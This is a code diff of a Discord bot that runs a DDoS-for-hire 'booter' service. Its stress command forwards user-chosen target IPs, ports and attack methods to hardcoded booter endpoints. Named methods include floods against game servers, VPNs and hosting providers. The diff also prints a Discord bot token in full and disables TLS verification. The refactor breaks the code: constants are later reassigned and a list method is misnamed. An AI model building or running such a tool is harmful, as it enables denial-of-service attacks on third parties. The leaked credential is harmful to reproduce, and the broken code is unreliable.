@@ -6,6 +6,7 @@ process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
 const setTitle = require('node-bash-title');
 const { userInfo } = require("os");
 const { exec } = require('child_process');
+const config = require("./config.json");
 
 /*██████████████████████████████████████████████
 
@@ -18,15 +19,15 @@ const { exec } = require('child_process');
 
 setTitle("[Clipzy V1.00]");
 
-var RED = "\x1b[91m";
-var YELLOW = "\x1b[93m";
-var CYAN = "\x1b[96m";
-var PURPLE = "\x1b[95m";
-var RESET = "\x1b[39m";
+const RED = "\x1b[91m";
+const YELLOW = "\x1b[93m";
+const CYAN = "\x1b[96m";
+const PURPLE = "\x1b[95m";
+const RESET = "\x1b[39m";
 
 //YOUR TOKEN HERE
 
-const accountToken = "Nzc1ODkzNTY1MTYzMzA3MDU5.X6s9MQ.WOHnY3LO2cSXKsVHvk3es0N2voU";
+const accountToken = config.Token;
 
 //BOT TURNING ON
 
@@ -54,37 +55,37 @@ discordBot.on("ready", () => {
 /************
  * BOT INFO *
 ************/
-var bot_prefix = "./";
-var bot_title = "b00t3rn3t";
-var bot_version = "v1.00";
-var bot_inv = "https://discord.com/api/oauth2/authorize?client_id=775893565163307059&permissions=8&scope=bot";
-var bot_server = "https://discord.gg/cknCDYxHdG";
+const bot_prefix = "./";
+const bot_title = "b00t3rn3t";
+const bot_version = "v1.00";
+const bot_inv = "https://discord.com/api/oauth2/authorize?client_id=775893565163307059&permissions=8&scope=bot";
+const bot_server = "https://discord.gg/cknCDYxHdG";
 
 /***************
  * MY INFO     *
  **************/
 
- var myDISCORD = "Fronto#8406";
- var myDISCORD_ID = "775448210859622442";
- var mySERVER = "Developer Laboratory";
- var mySERVER_ID = "775763129119801356";
- var myctmInv = "https://clipzy.cf/discord";
- var myINVITE = "https://discord.gg/cknCDYxHdG";
+ const myDISCORD = "Fronto#8406";
+ const myDISCORD_ID = "775448210859622442";
+ const mySERVER = "Developer Laboratory";
+ const mySERVER_ID = "775763129119801356";
+ const myctmInv = "https://clipzy.cf/discord";
+ const myINVITE = "https://discord.gg/cknCDYxHdG";
 /*---------------------------------String-------------------------------------*/
-var GEOAPI = "https://clipzy.cf/jDa00EfYS1nr7/?action=geoip&q=";
-var PORTSCANAPI = "https://clipzy.cf/jDa00EfYS1nr7/?action=portscan&q=";
+const GEOAPI = "https://clipzy.cf/jDa00EfYS1nr7/?action=geoip&q=";
+const PORTSCANAPI = "https://clipzy.cf/jDa00EfYS1nr7/?action=portscan&q=";
 
 //BOOT STRINGS
 //var BOOTERAPI = "http://194.62.6.173/skid.php?host=";
-var BOOTERAPI2 = "";
-var BOOTERAPI3 = "http://185.239.242.31/Qbot.php?&host=";
+const BOOTERAPI2 = "";
+const BOOTERAPI3 = "http://185.239.242.31/Qbot.php?&host=";
 // var STOPAPI = "http://167.99.10.248/test.php?method=STOP&ip=";
 // var STOPALLAPI = "http://167.99.10.248/test.php?method=STOPALL";
-var PORTAPI = "&port=";
-var TIMEAPI = "&time=";
-var METHODAPI = "&method=";
+const PORTAPI = "&port=";
+const TIMEAPI = "&time=";
+const METHODAPI = "&method=";
 
-var SEARCHED = "";
+const SEARCHED = "";
 
 discordBot.on("message", function (message) {
 
@@ -93,14 +94,14 @@ discordBot.on("message", function (message) {
        DISCORD STRINGS
     *********************/
 
-   var USER_TAG = message.author.tag;
-   var USER_NAME = message.author.username;
-   var USER_ID = message.author.id;
+   const USER_TAG = message.author.tag;
+   const USER_NAME = message.author.username;
+   const USER_ID = message.author.id;
 
-   var DISCORD_SERVER = message.guild.name;
-   var SERVER_ID = message.guild.id;
+   const DISCORD_SERVER = message.guild.name;
+   const SERVER_ID = message.guild.id;
 
-   var messagereceived = message.content;
+   const messagereceived = message.content;
 
    /**************************
     * END OF DISCORD STRINGS
@@ -116,7 +117,7 @@ discordBot.on("message", function (message) {
     if(message.author.bot) return;
     if (messagereceived.startsWith(bot_prefix)) {
         // if (USER_ID === myDISCORD_ID) { //WHITELIST A USER TO USE THE BOT (DISABLED FROM EVERYONE ELSE)
-            if (DISCORD_SERVER === "Unexpected Cracks") 
+            if (config.blacklist.include(DISCORD_SERVER)) // Maybe do you wanna use the server ID instead of name?
             { 
                 logger("command");
                 sendmsg("__**Error**__","This server (" + DISCORD_SERVER + ") has been blacklisted from being used! Try using the bot in another server or the main server!") ;
@@ -125,7 +126,7 @@ discordBot.on("message", function (message) {
             {
                 if(user_registered(USER_ID) == true) 
                 {
-                    var user_info = get_user_data(USER_ID);
+                    const user_info = get_user_data(USER_ID);
                     if(user_info.includes("blacklistedusr") == true) {
                         sendmsg("__**Blacklisted**__", "You are blacklisted from using this BOT!");
                     }
@@ -135,15 +136,15 @@ discordBot.on("message", function (message) {
                         sendmsg("Error", "You already a registered user, you cannot use this command!");
                     } else {
                         logger("command");
-                        var commands = "info help admincp geo pscan dblookup resolve urlresolve stress methods buypremium myinvite invite prices main_server bot_inv myinfo"
-                        var command = commands.split(' ');
+                        const commands = "info help admincp geo pscan dblookup resolve urlresolve stress methods buypremium myinvite invite prices main_server bot_inv myinfo"
+                        const command = commands.split(' ');
                         main();
                     }
                 }
                 else if(messagereceived.startsWith(bot_prefix + "register") == true) 
                 {
                     logger("command");
-                    var lul = register(USER_TAG, USER_ID);
+                    const lul = register(USER_TAG, USER_ID);
                     sendmsg("Register Status", lul);
                 }
                 else 
@@ -207,9 +208,9 @@ discordBot.on("message", function (message) {
         }
  
         if (messagereceived.startsWith(bot_prefix + command[3])) { // GEO LOCATOR
-            var urgn = messagereceived.split(' ');
-            var action = urgn[1]; //METHOD REQUEST
-            var ip = urgn[2];
+            const urgn = messagereceived.split(' ');
+            const action = urgn[1]; //METHOD REQUEST
+            const ip = urgn[2];
 
             fetch(GEOAPI + ip)
             .then(res => res.text())
@@ -217,16 +218,16 @@ discordBot.on("message", function (message) {
                 if(action == "all") {
                     sendmsg("__**Geo Locator Results For " + ip + "**__", "```" + body + "```");
                 } else if(action == "isp") {
-                    var split_geo = body.split('\n');
-                    var isp = split_geo[9];
+                    const split_geo = body.split('\n');
+                    const isp = split_geo[9];
                     sendmsg("__**Geo Locator Results For " + ip + "**__", "```" + isp + "```");
                 }})
         }
 
         if (messagereceived.startsWith(bot_prefix + command[4])) { //portscan COMMAND
             message.channel.send("Port scanning, Please wait.....");
-            var urgn = messagereceived.split(' ');
-            var ip = urgn[1]; 
+            const urgn = messagereceived.split(' ');
+            const ip = urgn[1]; 
 
             fetch(PORTSCANAPI + ip)
             .then(res => res.text())
@@ -238,8 +239,8 @@ discordBot.on("message", function (message) {
         }
 
         if (messagereceived.startsWith(bot_prefix + command[12])) { // invite COMMAND
-            var urgn = messagereceived.split(' ');
-            var invv = urgn[1]; //METHOD REQUEST
+            const urgn = messagereceived.split(' ');
+            const invv = urgn[1]; //METHOD REQUEST
             
             if (USER_ID === myDISCORD_ID) {
                 sendmsg("__**Fronto Invited You To A Server**__",invv)
@@ -255,16 +256,16 @@ discordBot.on("message", function (message) {
         }
 
         if (messagereceived.startsWith(bot_prefix + command[16])) { // main server inv
-            var getUSER_INFO = get_user_data(USER_ID);
-            var split_data = getUSER_INFO.split("','");
+            const getUSER_INFO = get_user_data(USER_ID);
+            const split_data = getUSER_INFO.split("','");
 
             sendmsg("__**My Info**__", "```User: " + split_data[0].replace("('", "") + "\nUser ID: " + split_data[1] + "\nMembership: " + split_data[2] + "\nMax Time: " + split_data[3].replace("')", "") + "```");
         }
 
         if (messagereceived.startsWith(bot_prefix + "search")) {
-            var urgn = messagereceived.split(' ');
-            var getUSER_INFO = get_user_data(urgn[1]);
-            var split_data = getUSER_INFO.split("','");
+            const urgn = messagereceived.split(' ');
+            const getUSER_INFO = get_user_data(urgn[1]);
+            const split_data = getUSER_INFO.split("','");
 
             sendmsg("__**User's> Info**__", "```User: " + split_data[0].replace("('", "") + "\nUser ID: " + split_data[1] + "\nMembership: " + split_data[2] + "\nMax Time: " + split_data[3].replace("')", "") + "```");
         }
@@ -274,11 +275,11 @@ discordBot.on("message", function (message) {
          * *****************/
 
         if(messagereceived.startsWith(bot_prefix + command[8])) { // smack COMMAND | BOOTER
-            var urgn = messagereceived.split(' ');
-            var method = urgn[1]; //METHOD REQUEST
-            var bootip = urgn[2];
-            var port = urgn[3];
-            var time = urgn[4];
+            const urgn = messagereceived.split(' ');
+            const method = urgn[1]; //METHOD REQUEST
+            const bootip = urgn[2];
+            const port = urgn[3];
+            const time = urgn[4];
             
             
 
@@ -324,17 +325,17 @@ discordBot.on("message", function (message) {
          * *****************/
 
         if (messagereceived.startsWith(bot_prefix + command[2])) { // admincp COMMAND
-                var urgn = messagereceived.split(' ');
-                var action = urgn[1];
-                var clientid = urgn[2];
+                const urgn = messagereceived.split(' ');
+                const action = urgn[1];
+                const clientid = urgn[2];
                 if(isAdmin(USER_ID) == true) 
                 {
                     if (action === "help") 
                     {
                         admincp();
                     } else if(action === "upgrade") {
-                        var newrank = urgn[3];
-                        var newtime = urgn[4];
+                        const newrank = urgn[3];
+                        const newtime = urgn[4];
                         if(newrank === "admin" || newrank === "reseller") {
                             if(USER_ID == myDISCORD_ID) {
                                 if(newrank === "admin") { newrank = "adminusr"; }
@@ -371,39 +372,28 @@ discordBot.on("message", function (message) {
      * **********************/
 
     function logger(type) {
-        var logdis = "";
-        var isAdmin = "";
-        var isModMessages = "";
-        var isModRoles = "";
+        const logdis = "";
+        const isAdmin = "No";
+        const isModMessages = "No";
+        const isModRoles = "No";
 
         /* BOT USER ID STRINGS */
-        var dyno = "155149108183695360"
-        var betterantispam = "501982335076532224"
-
+        const dyno = "155149108183695360"
+        const betterantispam = "501982335076532224"
+	
+	
         if(message.channel.permissionsFor(message.member).has("ADMINISTRATOR"))
         {
             isAdmin = "Yes";
         } 
-        else 
-        { 
-            isAdmin = "No"; 
-        }
         if(message.channel.permissionsFor(message.member).has("MANAGE_MESSAGES"))
         {
             isModMessages = "Yes";
         } 
-        else 
-        { 
-            isModMessages = "No"; 
-        }
         if(message.channel.permissionsFor(message.member).has("MANAGE_ROLES"))
         {
             isModRoles = "Yes";
         } 
-        else 
-        { 
-            isModRoles = "No"; 
-        }
 
         if (USER_NAME === bot_title || USER_ID === dyno || USER_ID === betterantispam)
         {} 
@@ -527,7 +517,7 @@ function sleep (time)
 
 function get_user_data(search) 
 {
-    var result = "";
+    const result = "";
     let file = fs.readFileSync("db/users.sql", "utf8");
     let arr = file.split(/\r?\n/);
     arr.forEach((line, idx)=> {
@@ -552,8 +542,8 @@ function upgradeUSER(uid, membership, time)
     {
         return "User is not registered yet! <@" + uid + "> has to register first!";
     } else {
-        var split_info = search_user.split("','");
-        var dbusrname = split_info[0].replace("('", "");
+        const split_info = search_user.split("','");
+        const dbusrname = split_info[0].replace("('", "");
         fs.appendFileSync('db/users.sql', "('" + dbusrname + "','" + uid + "','" + membership + "','" + time + "')\n");
         return "User updated! <@" + uid + "> Enjoy!";
     }
@@ -561,16 +551,14 @@ function upgradeUSER(uid, membership, time)
 
 function lineCOUNT(filename) 
 {
-    var fs=require('fs');
-    var filenamed = filename
-    var data=fs.readFileSync(filenamed);
-    var res=data.toString().split('\n').length;
+    const data=fs.readFileSync(filename);
+    const res=data.toString().split('\n').length;
     return res-1;
 }
 
 function user_registered(userid) 
 {
-    var search = get_user_data(userid);
+    const search = get_user_data(userid);
     if(search === null || !search || search == "")
     {
         return false;
@@ -583,7 +571,7 @@ function user_registered(userid)
 
 function user_premium(userid) 
 {
-    var search = get_user_data(userid);
+    const search = get_user_data(userid);
     if(search.includes("freeusr") == true)
     {
         return false;
@@ -596,7 +584,7 @@ function user_premium(userid)
 
 function isAdmin(userid) 
 {
-    var search = get_user_data(userid);
+    const search = get_user_data(userid);
     if(search.includes("adminusr"))
     {
         return true;
@@ -618,19 +606,19 @@ function isAdmin(userid)
 
 function adminCOUNT() 
 {
-
+     // unnecessary function?
 }
 
 function get_TIME(key)
 {
-    var user_info = get_user_data(key).split("','");
-    var fix = user_info[3].replace("')", "");
+    const user_info = get_user_data(key).split("','");
+    const fix = user_info[3].replace("')", "");
     return fix;
 }
 
 function get_METHODS(method)
 {
-    var resultz = "";
+    const resultz = "";
     fetch("https://clipzy.cf/methods.txt").then(res => res.text()).then(body => { 
         if(body.includes(method) == true){
             return true;
@@ -642,8 +630,8 @@ function get_METHODS(method)
 
 function get_method_and_send_2_api(ip, p, t, m)
 {
-    var api_1_methods = [ "value", "GRENADE", "UDPBYPASS", "XSYN", "FiveM", "SOAP", "CLDAP", "TCP-AMP", "DNS-Sec", "DNS" ];
-    var api_2_methods = [ "NTP", "ARD", "WSD", "LDAP", "K.O", "WEBSERVER-RAPE", "NFO-RX", "OVH-TCPv2", "NFO-X", "NFO-ATOM", "OVH-ATM", "ATOM-KILLALL", "ATOM-GAMEv1", "ATOM-FIVEM", "COD", "WSDv2", "VPN-KILL", "BLACKOUT", "IPSEC", "OPENVPN", "DVR", "FORTNITE", "FN-LAG", "R6-RANKED", "FIVEM" ];
+    const api_1_methods = [ "value", "GRENADE", "UDPBYPASS", "XSYN", "FiveM", "SOAP", "CLDAP", "TCP-AMP", "DNS-Sec", "DNS" ];
+    const api_2_methods = [ "NTP", "ARD", "WSD", "LDAP", "K.O", "WEBSERVER-RAPE", "NFO-RX", "OVH-TCPv2", "NFO-X", "NFO-ATOM", "OVH-ATM", "ATOM-KILLALL", "ATOM-GAMEv1", "ATOM-FIVEM", "COD", "WSDv2", "VPN-KILL", "BLACKOUT", "IPSEC", "OPENVPN", "DVR", "FORTNITE", "FN-LAG", "R6-RANKED", "FIVEM" ];
 
     if(api_1_methods.includes(m) == true ) 
     {
@@ -667,7 +655,7 @@ function get_method_and_send_2_api(ip, p, t, m)
 }
 
 function get_current_time(){
-
+   // unnecessary function?
 }
 
 function log_attacks(usr, ip, p, t, m, timestamp){
@@ -675,7 +663,7 @@ function log_attacks(usr, ip, p, t, m, timestamp){
 }
 
 function post_api_attack(ip, port, time, method) {
-    
+    // unnecessary function?
 }
 
 
